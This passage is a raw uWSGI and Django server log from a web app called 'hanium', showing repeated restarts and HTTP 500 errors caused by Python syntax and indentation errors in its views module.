  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 96
    print(i, '/', len(df))
        ^
IndentationError: expected an indented block
[pid: 4318|app: 0|req: 1/1] 66.102.6.201 () {42 vars in 540 bytes} [Thu Aug 27 06:16:07 2020] POST /webhook/ => generated 101963 bytes in 70 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:16:48 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5612c9d7ad00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5612c9d7ad00 pid: 4328 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4328, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 96
    print(i, '/', len(df))
        ^
IndentationError: expected an indented block
[pid: 4328|app: 0|req: 1/1] 66.102.6.203 () {42 vars in 540 bytes} [Thu Aug 27 06:16:52 2020] POST /webhook/ => generated 101962 bytes in 69 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:18:34 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5653b16a0d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5653b16a0d00 pid: 4341 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4341, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 121
    def predict_pos_text(text):
      ^
SyntaxError: invalid syntax
[pid: 4341|app: 0|req: 1/1] 66.102.6.203 () {42 vars in 540 bytes} [Thu Aug 27 06:18:42 2020] POST /webhook/ => generated 101874 bytes in 70 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:19:59 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x558183266d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x558183266d00 pid: 4352 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4352, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 149
    
    ^
SyntaxError: unexpected EOF while parsing
[pid: 4352|app: 0|req: 1/1] 66.102.6.201 () {42 vars in 540 bytes} [Thu Aug 27 06:20:03 2020] POST /webhook/ => generated 101903 bytes in 69 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:23:04 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x561882e7dd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x561882e7dd00 pid: 4361 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4361, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 70
    token=[]
        ^
SyntaxError: invalid syntax
[pid: 4361|app: 0|req: 1/1] 66.102.6.205 () {42 vars in 540 bytes} [Thu Aug 27 06:23:09 2020] POST /webhook/ => generated 101855 bytes in 69 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 70
    token=[]
        ^
SyntaxError: invalid syntax
[pid: 4361|app: 0|req: 2/2] 223.194.169.151 () {50 vars in 873 bytes} [Thu Aug 27 06:24:05 2020] GET / => generated 102536 bytes in 64 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /favicon.ico
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/deprecation.py", line 93, in __call__
    response = self.process_request(request)
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 53, in process_request
    if self.should_redirect_with_slash(request):
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 71, in should_redirect_with_slash
    not is_valid_path(request.path_info, urlconf) and
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 154, in is_valid_path
    resolve(path, urlconf)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 25, in resolve
    return get_resolver(urlconf).resolve(path)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 70
    token=[]
        ^
SyntaxError: invalid syntax
[pid: 4361|app: 0|req: 3/3] 223.194.169.151 () {48 vars in 791 bytes} [Thu Aug 27 06:24:06 2020] GET /favicon.ico => generated 118323 bytes in 70 msecs (HTTP/1.1 500) 2 headers in 96 bytes (1 switches on core 0)
Internal Server Error: /chat
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/deprecation.py", line 93, in __call__
    response = self.process_request(request)
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 53, in process_request
    if self.should_redirect_with_slash(request):
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 71, in should_redirect_with_slash
    not is_valid_path(request.path_info, urlconf) and
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 154, in is_valid_path
    resolve(path, urlconf)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 25, in resolve
    return get_resolver(urlconf).resolve(path)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 70
    token=[]
        ^
SyntaxError: invalid syntax
[pid: 4361|app: 0|req: 4/4] 223.194.169.151 () {50 vars in 881 bytes} [Thu Aug 27 06:24:13 2020] GET /chat => generated 118414 bytes in 69 msecs (HTTP/1.1 500) 2 headers in 96 bytes (1 switches on core 0)
Internal Server Error: /favicon.ico
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/deprecation.py", line 93, in __call__
    response = self.process_request(request)
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 53, in process_request
    if self.should_redirect_with_slash(request):
  File "/usr/local/lib/python3.6/dist-packages/django/middleware/common.py", line 71, in should_redirect_with_slash
    not is_valid_path(request.path_info, urlconf) and
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 154, in is_valid_path
    resolve(path, urlconf)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/base.py", line 25, in resolve
    return get_resolver(urlconf).resolve(path)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 70
    token=[]
        ^
SyntaxError: invalid syntax
[pid: 4361|app: 0|req: 5/5] 223.194.169.151 () {48 vars in 795 bytes} [Thu Aug 27 06:24:13 2020] GET /favicon.ico => generated 118327 bytes in 69 msecs (HTTP/1.1 500) 2 headers in 96 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:24:41 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5570db828d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5570db828d00 pid: 4368 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4368, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 70
    token = []
        ^
SyntaxError: invalid syntax
[pid: 4368|app: 0|req: 1/1] 66.102.6.203 () {42 vars in 540 bytes} [Thu Aug 27 06:24:47 2020] POST /webhook/ => generated 101857 bytes in 69 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:34:18 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5574954e8d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5574954e8d00 pid: 4555 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4555, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
